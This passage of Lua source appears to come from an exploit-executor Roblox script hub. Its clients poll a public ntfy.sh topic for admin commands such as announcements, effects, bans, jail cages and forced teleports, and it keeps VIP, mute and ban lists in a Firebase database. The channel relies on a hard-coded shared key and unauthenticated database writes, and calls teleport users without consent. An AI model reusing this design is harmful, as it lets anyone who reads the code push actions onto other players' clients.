-- Everyone running the hub RECEIVES commands; only OWNER / ADMIN get the "Admin" tab to SEND them.
-- Live commands go through a public ntfy.sh topic. The VIP list is saved in your Firebase
-- (path /vip) so it stays forever and works in every server.
--==================================================================================================
do
	local CMD_URL = "https://ntfy.sh/vaelor-hub-admin-cmd-v1" -- change the name to make it yours
	local CMD_KEY = "VXONTOP_2026" -- commands without this key are ignored
	local FB_URL = "https://vaelor-firebase-default-rtdb.asia-southeast1.firebasedatabase.app"
	local CMD_POLL = 4 -- seconds between checks
	local VIP_REFRESH = 60 -- seconds between VIP list refreshes
	local CMD_COOLDOWN = 3 -- seconds between commands you send
	local PROTECT_OWNER_BAN = true -- true = the OWNER account cannot be banned (prevents a permanent lock-out). All other commands work staff <-> staff.
	local CMD_MAX_TEXT = 200
	local ANNOUNCE_TIME = 8 -- seconds an announcement stays on screen
	local CALL_TIMEOUT = 30 -- seconds a call stays before it expires
	local MAX_CARDS = 4 -- popups on screen at once (extra ones are ignored = anti spam)

	local theme = Loader.Theme
	local myRank = Library.GetCardTitle(LocalPlayer.Name)
	local isStaff = myRank == "OWNER" or myRank == "ADMIN"
	local myLower = string.lower(LocalPlayer.Name)
	local fbBase = string.gsub(FB_URL, "/+$", "")

	local cmdActive = true
	local seen = {}
	local firstPoll = true
	local sinceValue = "10m"
	local lastSend = 0
	local myCalls = {}
	local myGiveaways = {}
	local myPolls = {}
	local freezeToken = 0
	local ragToken = 0
	local ragStore = nil
	-- JAIL: a red cage around the jailed player. EVERY hub user in the same server sees it (visual only);
	-- only the jailed player's own client gets the solid walls and is pulled back if they leave.
	local cages = {}
	local cageTokens = {}

	local function clearCage(lname)
		local c = cages[lname]
		cages[lname] = nil
		if c then
			if c.conn then
				c.conn:Disconnect()
			end
			if c.folder then
				c.folder:Destroy()
			end
		end
	end

	local function stopCage(lname)
		cageTokens[lname] = (cageTokens[lname] or 0) + 1
		clearCage(lname)
	end

	local function findPlayerByName(lname)
		for _, plr in ipairs(InfoPlayers:GetPlayers()) do
			if string.lower(plr.Name) == lname then
				return plr
			end
		end
		return nil
	end

	local function startCage(lname, pos, collide, enforce, sec, onDone)
		clearCage(lname)
		cageTokens[lname] = (cageTokens[lname] or 0) + 1
		local mine = cageTokens[lname]

		local folder = Instance.new("Folder")
		folder.Name = "VaelorJail"
		folder.Parent = workspace

		local function wall(size, offset)
			local part = Instance.new("Part")
			part.Anchored = true
			part.CanCollide = collide
			part.CanTouch = false
			part.CanQuery = false
			part.Size = size
			part.Position = pos + offset
			part.Color = Color3.fromRGB(255, 60, 70)
			part.Material = Enum.Material.Neon
			part.Transparency = 0.45
			part.Parent = folder
		end
		-- inner room: 10 x 10 x 10 studs around the player
		wall(Vector3.new(12, 1, 12), Vector3.new(0, -4, 0)) -- floor
		wall(Vector3.new(12, 1, 12), Vector3.new(0, 7, 0)) -- ceiling
		wall(Vector3.new(12, 10, 1), Vector3.new(0, 1.5, 5.5))
		wall(Vector3.new(12, 10, 1), Vector3.new(0, 1.5, -5.5))
		wall(Vector3.new(1, 10, 12), Vector3.new(5.5, 1.5, 0))
		wall(Vector3.new(1, 10, 12), Vector3.new(-5.5, 1.5, 0))

		local conn
		if enforce then
			conn = game:GetService("RunService").Heartbeat:Connect(function()
				local r = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				if r and (r.Position - pos).Magnitude > 6 then
					r.AssemblyLinearVelocity = Vector3.zero
					r.CFrame = CFrame.new(pos)
				end
			end)
		end
		cages[lname] = { folder = folder, conn = conn }

		task.delay(sec, function()
			if cageTokens[lname] == mine then
				clearCage(lname)
				if onDone then
					onDone()
				end
			end
		end)
	end

	Loader:AddCleanup(function()
		for name in pairs(cages) do
			clearCage(name)
		end
	end)

	-- Client side ragdoll: joints become ball sockets for a while, then everything is restored
	local function setRagdoll(on)
		local char = LocalPlayer.Character
		local hum = char and char:FindFirstChildOfClass("Humanoid")
		if on then
			if not hum or ragStore then
				return
			end
			ragStore = {}
			hum.PlatformStand = true
			hum:ChangeState(Enum.HumanoidStateType.Physics)
			for _, m in ipairs(char:GetDescendants()) do
				if m:IsA("Motor6D") and m.Part0 and m.Part1 and m.Name ~= "RootJoint" and m.Name ~= "Root" then
					local a0 = Instance.new("Attachment")
					a0.CFrame = m.C0
					a0.Parent = m.Part0
					local a1 = Instance.new("Attachment")
					a1.CFrame = m.C1
					a1.Parent = m.Part1
					local ball = Instance.new("BallSocketConstraint")
					ball.Attachment0 = a0
					ball.Attachment1 = a1
					ball.LimitsEnabled = true
					ball.TwistLimitsEnabled = true
					ball.UpperAngle = 80
					ball.TwistLowerAngle = -45
					ball.TwistUpperAngle = 45
					ball.Parent = m.Part0
					m.Enabled = false
					table.insert(ragStore, { m, a0, a1, ball })
				end
			end
			local root = char:FindFirstChild("HumanoidRootPart")
			if root then
				root.AssemblyLinearVelocity = root.AssemblyLinearVelocity + Vector3.new(0, 25, 0)
			end
		else
			local store = ragStore
			ragStore = nil
			if store then
				for _, e in ipairs(store) do
					pcall(function()
						if e[1].Parent then
							e[1].Enabled = true
						end
						e[2]:Destroy()
						e[3]:Destroy()
						e[4]:Destroy()
			end)
				end
			end
			if hum then
				hum.PlatformStand = false
				hum:ChangeState(Enum.HumanoidStateType.GettingUp)
			end
		end
	end
	local giveawayJoined = {}
	local joinedCount = 0
	local acceptedCount, declinedCount = 0, 0
	local acceptedStat, declinedStat, joinStat
	local activeCall = false

	local function clean(text)
		text = tostring(text or "")
		text = text:gsub("[%c]", " ")
		text = text:gsub("^%s+", ""):gsub("%s+$", "")
		return string.sub(text, 1, CMD_MAX_TEXT)
	end

	local function isStaffName(username)
		local rank = Library.GetCardTitle(username)
		return rank == "OWNER" or rank == "ADMIN", rank
	end

	-- Firebase helper -----------------------------------------------------------------------------
	local function fb(method, path, bodyTable)
		if not httpRequest then
			return false, nil
		end
		local ok, res = pcall(httpRequest, {
			Url = fbBase .. path,
			Method = method,
			Headers = { ["Content-Type"] = "application/json" },
			Body = bodyTable and InfoHttp:JSONEncode(bodyTable) or nil,
		})
		if not ok or type(res) ~= "table" then
			return false, nil
		end
		local code = tonumber(res.StatusCode) or 0
		return (res.Success == true) or (code >= 200 and code < 300), res
	end

	-- Popup holder (top center, above everything) ------------------------------------------------
	local holder = create("Frame", {
		Name = "AdminPopups",
		AnchorPoint = Vector2.new(0.5, 0),
		Position = UDim2.new(0.5, 0, 0, 12),
		Size = UDim2.new(0.92, 0, 1, -24),
		BackgroundTransparency = 1,
		ZIndex = 50,
		Parent = Loader.Gui,
	})
	create("UISizeConstraint", { MaxSize = Vector2.new(400, 99999), Parent = holder })
	create("UIListLayout", {
		SortOrder = Enum.SortOrder.LayoutOrder,
		Padding = UDim.new(0, 8),
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
		Parent = holder,
	})

	local function cardCount()
		local n = 0
		for _, child in ipairs(holder:GetChildren()) do
			if child:IsA("Frame") then
				n += 1
			end
		end
		return n
	end

	local function addLabel(parent, order, text, size, color, font)
		return create("TextLabel", {
			LayoutOrder = order,
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundTransparency = 1,
			Text = text,
			TextColor3 = color,
			Font = font or Enum.Font.Gotham,
			TextSize = size,
			TextWrapped = true,
			TextXAlignment = Enum.TextXAlignment.Left,
			TextYAlignment = Enum.TextYAlignment.Top,
			ZIndex = 51,
			Parent = parent,
		})
	end

	-- Banner card: icon circle + title + line + text + progress bar -------------------------------
	local function buildCard(accent, titleText, icon, duration)
		local alive = true
		local card = create("Frame", {
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundColor3 = theme.Background,
			BorderSizePixel = 0,
			Active = true,
			ZIndex = 51,
			Parent = holder,
		})
		addCorner(card, 12)
		addStroke(card, accent, 2, 0)
		local scale = create("UIScale", { Scale = 0.85, Parent = card })
		Loader:Tween(scale, TI.Back, { Scale = 1 })

		local iconFrame = create("Frame", {
			Position = UDim2.fromOffset(12, 14),
			Size = UDim2.fromOffset(46, 46),
			BackgroundColor3 = accent:Lerp(Color3.new(0, 0, 0), 0.6),
			BorderSizePixel = 0,
			ZIndex = 51,
			Parent = card,
		})
		addCorner(iconFrame, UDim.new(1, 0))
		addStroke(iconFrame, accent, 2, 0)
		create("TextLabel", {
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			Text = icon,
			TextSize = 22,
			Font = Enum.Font.GothamBold,
			TextColor3 = theme.Text,
			ZIndex = 52,
			Parent = iconFrame,
		})

		local body = create("Frame", {
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundTransparency = 1,
			ZIndex = 51,
			Parent = card,
		})
		addPadding(body, 12, 12, 12, 70)
		create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 6), Parent = body })

		addLabel(body, 1, titleText, 14, accent:Lerp(Color3.new(1, 1, 1), 0.35), Enum.Font.GothamBold)
		create("Frame", {
			LayoutOrder = 2,
			Size = UDim2.new(1, 0, 0, 2),
			BackgroundColor3 = accent,
			BorderSizePixel = 0,
			ZIndex = 51,
			Parent = body,
		})

		local track = create("Frame", {
			LayoutOrder = 100,
			Size = UDim2.new(1, 0, 0, 4),
			BackgroundColor3 = theme.SurfaceLight,
			BorderSizePixel = 0,
			ZIndex = 51,
			Parent = body,
		})
		addCorner(track, UDim.new(1, 0))
		local fill = create("Frame", {
			Size = UDim2.fromScale(1, 1),
			BackgroundColor3 = accent,
			BorderSizePixel = 0,
			ZIndex = 52,
			Parent = track,
		})
		addCorner(fill, UDim.new(1, 0))
		Loader:Tween(fill, TweenInfo.new(duration, Enum.EasingStyle.Linear), { Size = UDim2.fromScale(0, 1) })

		local function dismiss()
			if not alive then
				return
			end
			alive = false
			Loader:Tween(scale, TI.Fast, { Scale = 0 })
			task.delay(0.2, function()
				card:Destroy()
			end)
		end
		task.delay(duration, dismiss)

		return card, body, dismiss
	end

	-- IY-style card: dark box, centered title + text, two buttons at the bottom -------------------
	-- onLeft / onRight receive (dismiss). Returns card, dismiss, leftButton.
	local function buildIYCard(titleText, bodyText, leftText, rightText, duration, onLeft, onRight)
		local alive = true
		local card = create("Frame", {
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundColor3 = Color3.fromRGB(35, 35, 35),
			BackgroundTransparency = 0.1,
			BorderSizePixel = 0,
			Active = true,
			ZIndex = 51,
			Parent = holder,
		})
		create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Parent = card })

		local top = create("Frame", {
			LayoutOrder = 1,
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundTransparency = 1,
			ZIndex = 51,
			Parent = card,
		})
		addPadding(top, 10, 10, 8, 10)
		create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 4), Parent = top })

		local function centered(order, text, size, font)
			local l = addLabel(top, order, text, size, theme.Text, font)
			l.TextXAlignment = Enum.TextXAlignment.Center
			return l
		end
		centered(1, titleText, 16, Enum.Font.GothamBold)
		centered(2, bodyText, 13, Enum.Font.Gotham)

		local row = create("Frame", {
			LayoutOrder = 2,
			Size = UDim2.new(1, 0, 0, 34),
			BackgroundTransparency = 1,
			ZIndex = 51,
			Parent = card,
		})
		local function dismiss()
			if not alive then
				return
			end
			alive = false
			card:Destroy()
		end
		local function btn(text, pos, cb)
			local b = create("TextButton", {
				Position = pos,
				Size = UDim2.new(0.5, -1, 1, 0),
				BackgroundColor3 = Color3.fromRGB(55, 55, 55),
				BackgroundTransparency = 0.1,
				AutoButtonColor = true,
				Text = text,
				TextColor3 = theme.Text,
				Font = Enum.Font.GothamBold,
				TextSize = 14,
				BorderSizePixel = 0,
				ZIndex = 52,
				Parent = row,
			})
			b.Activated:Connect(function()
				if alive then
					cb(dismiss)
				end
			end)
			return b
		end
		local leftBtn = btn(leftText, UDim2.new(0, 0, 0, 0), onLeft)
		btn(rightText, UDim2.new(0.5, 1, 0, 0), onRight)

		task.delay(duration, dismiss)
		return card, dismiss, leftBtn
	end

	-- Invite card: "<RANK> INVITING TO THEIR SERVER" + Decline on the side + TELEPORT below -------
	local function buildInviteCard(rank, accent, display, username, note, duration, onTeleport, onDecline)
		local alive = true
		local card = create("Frame", {
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundColor3 = theme.Background,
			BorderSizePixel = 0,
			Active = true,
			ZIndex = 51,
			Parent = holder,
		})
		addCorner(card, 12)
		addStroke(card, accent, 2, 0)
		local scale = create("UIScale", { Scale = 0.85, Parent = card })
		Loader:Tween(scale, TI.Back, { Scale = 1 })
		create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Parent = card })

		-- top: text on the left, DECLINE on the right side
		local top = create("Frame", {
			LayoutOrder = 1,
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundTransparency = 1,
			ZIndex = 51,
			Parent = card,
		})
		addPadding(top, 12, 10, 8, 12)

		local textCol = create("Frame", {
			Size = UDim2.new(1, -84, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundTransparency = 1,
			ZIndex = 51,
			Parent = top,
		})
		create("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 4), Parent = textCol })
		addLabel(textCol, 1, rank .. " INVITING TO THEIR SERVER", 14, accent:Lerp(Color3.new(1, 1, 1), 0.35), Enum.Font.GothamBold)
		addLabel(textCol, 2, display .. " (@" .. string.sub(tostring(username), 1, 30) .. ")", 12, theme.SubText)
		if note and note ~= "" then
			addLabel(textCol, 3, '"' .. note .. '"', 12, theme.Text)
		end

		local function dismiss()
			if not alive then
				return
			end
			alive = false
			Loader:Tween(scale, TI.Fast, { Scale = 0 })
			task.delay(0.2, function()
				card:Destroy()
			end)
		end

		local declineBtn = create("TextButton", {
			AnchorPoint = Vector2.new(1, 0),
			Position = UDim2.new(1, 0, 0, 0),
			Size = UDim2.fromOffset(74, 30),
			BackgroundColor3 = theme.SurfaceLight,
			AutoButtonColor = false,
			Text = "Decline",
			TextColor3 = theme.Text,
			Font = Enum.Font.GothamBold,
			TextSize = 13,
			BorderSizePixel = 0,
			ZIndex = 52,
			Parent = top,
		})
		addCorner(declineBtn, 8)
		addStroke(declineBtn, theme.Error, 1, 0.3)
		Loader:_AddButtonFx(declineBtn, theme.SurfaceLight, theme.Error:Lerp(theme.Background, 0.4))
		declineBtn.Activated:Connect(function()
			if alive then
				onDecline(dismiss)
			end
		end)

		-- bottom: TELEPORT
		local bottom = create("Frame", {
			LayoutOrder = 2,
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			BackgroundTransparency = 1,
			ZIndex = 51,
			Parent = card,
		})
		addPadding(bottom, 0, 12, 10, 12)
		local tpBtn = create("TextButton", {
			Size = UDim2.new(1, 0, 0, 36),
			BackgroundColor3 = theme.Success:Lerp(theme.Background, 0.25),
			AutoButtonColor = false,
			Text = "TELEPORT",
			TextColor3 = theme.Text,
			Font = Enum.Font.GothamBold,
			TextSize = 14,
			BorderSizePixel = 0,
			ZIndex = 52,
			Parent = bottom,
		})
		addCorner(tpBtn, 8)
		Loader:_AddButtonFx(tpBtn, theme.Success:Lerp(theme.Background, 0.25), theme.Success)
		tpBtn.Activated:Connect(function()
			if alive then
				onTeleport(dismiss)
			end
		end)

		-- timer bar
		local track = create("Frame", {
			LayoutOrder = 3,
			Size = UDim2.new(1, 0, 0, 4),
			BackgroundColor3 = theme.SurfaceLight,
			BorderSizePixel = 0,
			ZIndex = 51,
			Parent = card,
		})
		local fill = create("Frame", {
			Size = UDim2.fromScale(1, 1),
			BackgroundColor3 = accent,
			BorderSizePixel = 0,
			ZIndex = 52,
			Parent = track,
		})
		Loader:Tween(fill, TweenInfo.new(duration, Enum.EasingStyle.Linear), { Size = UDim2.fromScale(0, 1) })
		task.delay(duration, dismiss)

		return card, dismiss
	end

	-- VIP list (Firebase) ------------------------------------------------------------------------
	local firstVip = true

	local function refreshVip()
		local ok, res = fb("GET", "/vip.json")
		if not ok or type(res.Body) ~= "string" then
			return
		end
		local okJson, data = pcall(InfoHttp.JSONDecode, InfoHttp, res.Body)
		if not okJson then
			return
		end
		local newSet = {}
		if type(data) == "table" then
			for key, entry in pairs(data) do
				local exp = type(entry) == "table" and tonumber(entry.exp)
				if not exp or exp > os.time() then -- no "exp" = permanent
					newSet[string.lower(tostring(key))] = true
				end
			end
		end
		local was = Library.VipSet[myLower]
		Library.VipSet = newSet
		if newSet[myLower] and not was and not firstVip and not isStaff then
			Loader:Notify({ Title = "VIP", Content = "You received the VIP title!", Type = "Success", Duration = 6, Force = true })
		end
		firstVip = false
	end

	local firstMod = true
	local banHandled = false

	local function fetchSet(path)
		local ok, res = fb("GET", path)
		if not ok or type(res.Body) ~= "string" then
			return nil
		end
		local okJson, data = pcall(InfoHttp.JSONDecode, InfoHttp, res.Body)
		if not okJson then
			return nil
		end
		local set = {}
		if type(data) == "table" then
			for key in pairs(data) do
				set[string.lower(tostring(key))] = true
			end
		end
		return set
	end

	local function applyBan()
		if banHandled or (PROTECT_OWNER_BAN and myRank == "OWNER") then
			return
		end
		banHandled = true
		Loader:Notify({ Title = "Banned", Content = "You are banned from VÆLOR HUB.", Type = "Error", Duration = 99999999, Force = true })
		task.delay(4, function()
			if not Loader._destroyed then
				Loader:Destroy()
			end
		end)
	end

	local function refreshModeration()
		local muted = fetchSet("/muted.json")
		if muted then
			local was = Library.MutedSet[myLower]
			Library.MutedSet = muted
			if muted[myLower] and not was and not firstMod then
				Loader:Notify({ Title = "Muted", Content = "An admin muted you in Global Chat.", Type = "Warning", Duration = 6, Force = true })
			end
		end
		local tagoff = Library.TagPersist ~= false and fetchSet("/tagoff.json")
		if tagoff then
			Library.TagHidden.OWNER = tagoff.owner or nil
			Library.TagHidden.ADMIN = tagoff.admin or nil
			if Library.RefreshTags then
				Library.RefreshTags()
			end
		end
		local banned = fetchSet("/banned.json")
		if banned then
			Library.BannedSet = banned
			if banned[myLower] then
				applyBan()
			end
		end
		firstMod = false
	end

	local function saveVip(lname, by, days)
		local ok = fb("PUT", "/vip/" .. lname .. ".json", {
			by = by,
			t = os.time(),
			exp = days and (os.time() + days * 86400) or nil, -- nil = permanent
		})
		if ok then
			Library.VipSet[lname] = true
		end
		return ok
	end

	-- Post a command / response ------------------------------------------------------------------
	-- Fun effect: emoji rain over the screen of every hub user (cosmetic only) --------------------
	local PARTY_STYLES = {
		Confetti = { "🎉", "🎊", "✨", "🥳" },
		Hearts = { "💜", "💖", "💗", "💞" },
		Snow = { "❄️", "⛄", "❄️", "✨" },
		Stars = { "⭐", "🌟", "✨", "💫" },
		Fire = { "🔥", "✨", "🔥", "💥" },
	}
	Library.PartyStyles = PARTY_STYLES
	Library.ShowParty = function(style, fromName)
		local emojis = PARTY_STYLES[style]
		if not emojis then
			return
		end
		local tweens = game:GetService("TweenService")
		local layer = Instance.new("Frame")
		layer.Name = "PartyLayer"
		layer.BackgroundTransparency = 1
		layer.Size = UDim2.fromScale(1, 1)
		layer.ZIndex = 60
		layer.Active = false
		layer.ClipsDescendants = true
		layer.Parent = Loader.Gui
		for i = 1, 45 do
			task.delay(math.random() * 3, function()
				if not layer.Parent then
					return
				end
				local size = math.random(18, 34)
				local x = math.random()
				local floatUp = style == "Hearts" or style == "Fire"
				local sway = math.random(-12, 12) / 100
				local piece = Instance.new("TextLabel")
				piece.BackgroundTransparency = 1
				piece.Text = emojis[math.random(1, #emojis)]
				piece.TextSize = size
				piece.Size = UDim2.fromOffset(size + 6, size + 6)
				piece.Position = UDim2.new(x, 0, floatUp and 1 or 0, floatUp and 20 or -50)
				piece.Rotation = math.random(-30, 30)
				piece.ZIndex = 60
				piece.Parent = layer
				local fall = math.random(35, 60) / 10
				local goal = {
					Position = UDim2.new(math.clamp(x + sway, 0, 1), 0, floatUp and 0 or 1, floatUp and -50 or 20),
					Rotation = math.random(-200, 200),
				}
				tweens:Create(piece, TweenInfo.new(fall, Enum.EasingStyle.Sine), goal):Play()
				task.delay(fall + 0.1, function()
					piece:Destroy()
				end)
			end)
		end
		task.delay(9, function()
			layer:Destroy()
		end)
		if fromName then
			Loader:Notify({ Title = "Party Time!", Content = fromName .. " started a " .. style .. " party", Type = "Success", Duration = 4 })
		end
	end

	-- MORE FUN EFFECTS (cosmetic only, client side). Everything lives on Library to save locals ----
	Library.PartyStyles.Disco = { "🪩", "🎵", "🎶", "💃", "🕺" }
	Library.FxKinds = { fireworks = true, disco = true, countdown = true, bigtext = true, coin = true, dice = true, emoji = true, mega = true }
	Library.FxCount = 0

	Library.CutText = function(text, n)
		text = tostring(text or "")
		local ok, off = pcall(utf8.offset, text, n + 1)
		if not ok then
			return string.sub(text, 1, n)
		end
		if off then
			return string.sub(text, 1, off - 1)
		end
		return text
	end

	Library.FxLayer = function(life)
		local layer = Instance.new("Frame")
		layer.Name = "FxLayer"
		layer.BackgroundTransparency = 1
		layer.Size = UDim2.fromScale(1, 1)
		layer.ZIndex = 61
		layer.Active = false
		layer.ClipsDescendants = true
		layer.Parent = Loader.Gui
		Library.FxCount += 1
		task.delay(life, function()
			Library.FxCount = math.max(0, Library.FxCount - 1)
			layer:Destroy()
		end)
		return layer
	end

	Library.RunFx = function(kind, data, fromName)
		if not Library.FxKinds[kind] or Library.FxCount >= 2 then
			return
		end
		data = type(data) == "table" and data or {}
		local tweens = game:GetService("TweenService")
		local gold = Color3.fromRGB(255, 220, 90)

		local function label(parent, text, size, color)
			local l = Instance.new("TextLabel")
			l.BackgroundTransparency = 1
			l.Text = text
			l.TextSize = size
			l.TextColor3 = color or Color3.new(1, 1, 1)
			l.Font = Enum.Font.GothamBlack
			l.TextWrapped = true
			l.AnchorPoint = Vector2.new(0.5, 0.5)
			l.Position = UDim2.fromScale(0.5, 0.45)
			l.Size = UDim2.new(0.9, 0, 0, size * 2 + 20)
			l.ZIndex = 62
			l.Parent = parent
			local stroke = Instance.new("UIStroke")
			stroke.Thickness = 2
			stroke.Color = Color3.fromRGB(20, 20, 30)
			stroke.Parent = l
			return l
		end

		local function fade(l, t)
			tweens:Create(l, TweenInfo.new(t), { TextTransparency = 1 }):Play()
			local stroke = l:FindFirstChildOfClass("UIStroke")
			if stroke then
				tweens:Create(stroke, TweenInfo.new(t), { Transparency = 1 }):Play()
			end
		end

		local function pop(l, from, to)
			l.TextSize = from
			tweens:Create(l, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { TextSize = to }):Play()
		end

		local function fireworks()
			local layer = Library.FxLayer(7)
			for b = 1, 6 do
				task.delay((b - 1) * 0.7, function()
					if not layer.Parent then
						return
					end
					local cx, cy = 0.15 + math.random() * 0.7, 0.15 + math.random() * 0.4
					local hue = math.random()
					for i = 1, 16 do
						local ang = (i / 16) * math.pi * 2
						local dist = math.random(70, 130)
						local piece = Instance.new("TextLabel")
						piece.BackgroundTransparency = 1
						piece.Text = "●"
						piece.TextSize = math.random(12, 20)
						piece.TextColor3 = Color3.fromHSV((hue + i / 64) % 1, 0.7, 1)
						piece.AnchorPoint = Vector2.new(0.5, 0.5)
						piece.Size = UDim2.fromOffset(20, 20)
						piece.Position = UDim2.fromScale(cx, cy)
						piece.ZIndex = 62
						piece.Parent = layer
						tweens:Create(piece, TweenInfo.new(1.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
							Position = UDim2.new(cx, math.cos(ang) * dist, cy, math.sin(ang) * dist + 25),
							TextTransparency = 1,
						}):Play()
						task.delay(1.2, function()
							piece:Destroy()
						end)
					end
				end)
			end
		end

		if kind == "fireworks" then
			fireworks()

		elseif kind == "mega" then
			fireworks()
			Library.ShowParty("Confetti", nil)

		elseif kind == "disco" then
			-- slow, soft colour wash (no strobing / fast flashing)
			local layer = Library.FxLayer(9)
			local wash = Instance.new("Frame")
			wash.BorderSizePixel = 0
			wash.Size = UDim2.fromScale(1, 1)
			wash.BackgroundTransparency = 0.86
			wash.BackgroundColor3 = Color3.fromHSV(math.random(), 0.8, 1)
			wash.ZIndex = 61
			wash.Parent = layer
			task.spawn(function()
				local hue = math.random()
				for _ = 1, 6 do
					if not wash.Parent then
						return
					end
					hue = (hue + 0.17) % 1
					tweens:Create(wash, TweenInfo.new(1.4, Enum.EasingStyle.Sine), { BackgroundColor3 = Color3.fromHSV(hue, 0.8, 1) }):Play()
					task.wait(1.4)
				end
				if wash.Parent then
					tweens:Create(wash, TweenInfo.new(0.8), { BackgroundTransparency = 1 }):Play()
				end
			end)
			Library.ShowParty("Disco", nil)

		elseif kind == "countdown" then
			local secs = math.clamp(math.floor(tonumber(data.secs) or 3), 3, 10)
			local goText = tostring(data.text or "")
			if goText == "" then
				goText = "GO!"
			end
			local layer = Library.FxLayer(secs + 4)
			task.spawn(function()
				for n = secs, 1, -1 do
					if not layer.Parent then
						return
					end
					local l = label(layer, tostring(n), 110, gold)
					pop(l, 40, 110)
					task.wait(0.7)
					fade(l, 0.3)
					task.wait(0.3)
					l:Destroy()
				end
				if not layer.Parent then
					return
				end
				local go = label(layer, goText, 70, Color3.fromRGB(120, 255, 140))
				pop(go, 30, 70)
				Library.ShowParty("Confetti", nil)
				task.wait(1.6)
				fade(go, 0.4)
			end)

		elseif kind == "bigtext" then
			local text = tostring(data.text or "")
			if text == "" then
				return
			end
			local dur = math.clamp(tonumber(data.dur) or 6, 3, 15)
			local layer = Library.FxLayer(dur + 1)
			local l = label(layer, text, 44, Color3.new(1, 1, 1))
			pop(l, 10, 44)
			task.spawn(function()
				local t0 = os.clock()
				while l.Parent and os.clock() - t0 < dur do
					l.TextColor3 = Color3.fromHSV(((os.clock() - t0) * 0.25) % 1, 0.55, 1)
					task.wait(0.05)
				end
				if l.Parent then
					fade(l, 0.5)
				end
			end)

		elseif kind == "coin" then
			local result = data.val == "Tails" and "Tails" or "Heads"
			local layer = Library.FxLayer(5)
			local coin = label(layer, "🪙", 80)
			coin.Position = UDim2.fromScale(0.5, 0.38)
			local res = label(layer, "", 40, gold)
			res.Position = UDim2.fromScale(0.5, 0.58)
			tweens:Create(coin, TweenInfo.new(1.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Rotation = 1080 }):Play()
			task.delay(1.9, function()
				if res.Parent then
					res.Text = string.upper(result) .. "!"
					pop(res, 18, 40)
				end
			end)

		elseif kind == "dice" then
			local sides = (tonumber(data.sides) == 20 or tonumber(data.sides) == 100) and tonumber(data.sides) or 6
			local val = math.clamp(math.floor(tonumber(data.val) or 1), 1, sides)
			local layer = Library.FxLayer(5)
			local icon = label(layer, "🎲", 70)
			icon.Position = UDim2.fromScale(0.5, 0.36)
			local num = label(layer, "?", 60, gold)
			num.Position = UDim2.fromScale(0.5, 0.56)
			task.spawn(function()
				for i = 1, 14 do
					if not num.Parent then
						return
					end
					num.Text = tostring(math.random(1, sides))
					icon.Rotation = (i * 40) % 360
					task.wait(0.1 + i * 0.012)
				end
				if num.Parent then
					num.Text = tostring(val) .. " / " .. tostring(sides)
					icon.Rotation = 0
					pop(num, 30, 60)
				end
			end)

		elseif kind == "emoji" then
			local e = Library.CutText(data.text, 3)
			if e == "" then
				return
			end
			Library.PartyStyles.Custom = { e, e, e, "✨" }
			Library.ShowParty("Custom", nil)
		end

		if fromName then
			local names = { fireworks = "Fireworks", disco = "Disco Mode", countdown = "a Countdown", bigtext = "a Big Text", coin = "a Coin Flip", dice = "a Dice Roll", emoji = "an Emoji Rain", mega = "a MEGA Party" }
			Loader:Notify({ Title = "Fun", Content = fromName .. " started " .. (names[kind] or kind), Type = "Success", Duration = 3 })
		end
	end

	local function post(payload)
		if not httpRequest then
			error("Your executor has no HTTP support.")
		end
		payload.k = CMD_KEY
		payload.uid = LocalPlayer.UserId
		payload.name = LocalPlayer.Name
		payload.display = LocalPlayer.DisplayName
		payload.n = payload.n or (LocalPlayer.UserId .. "-" .. math.random(100000, 999999) .. "-" .. os.time())
		seen[payload.n] = true
		pcall(httpRequest, {
			Url = CMD_URL,
			Method = "POST",
			Headers = { ["Content-Type"] = "text/plain" },
			Body = InfoHttp:JSONEncode(payload),
		})
		return payload.n
	end

	-- Receive: announcement ----------------------------------------------------------------------
	local function showAnnouncement(rank, display, text, dur)
		if cardCount() >= MAX_CARDS then
			return
		end
		dur = math.clamp(tonumber(dur) or ANNOUNCE_TIME, 5, 60)
		local accent = RANK_CARD_COLORS[rank] or theme.Accent
		-- cannot be dismissed: it stays until its timer (progress bar) runs out
		local _, body = buildCard(accent, "ANNOUNCEMENT OF [ VÆLOR " .. rank .. " ]", "📢", dur)
		addLabel(body, 3, text, 14, theme.Text)
		addLabel(body, 4, "— " .. display, 11, theme.SubText)
		Loader:Log("Announcement from " .. display .. ": " .. text, "Info")
	end

	-- Receive: call -> "Server Invite" (Teleport / Decline) --------------------------------------
	local function showCall(data)
		-- OWNER / ADMIN call: nobody can decline, everyone is teleported automatically.
		-- (set FORCE_JOIN = false to bring the Decline card back for staff receivers)
		local FORCE_JOIN = true
		if FORCE_JOIN or not isStaff then
			if activeCall then
				return
			end
			activeCall = true
			local callName = string.sub(tostring(data.display or data.name), 1, 40)
			Loader:Notify({ Title = "Joining", Content = callName .. " called you. Teleporting...", Type = "Info", Duration = 3, Force = true })
			task.spawn(function()
				pcall(post, { c = "resp", ref = data.n, r = "accept" })
				task.wait(1.5)
				pcall(function()
					InfoTeleport:TeleportToPlaceInstance(data.place, data.job, LocalPlayer)
				end)
				task.wait(8)
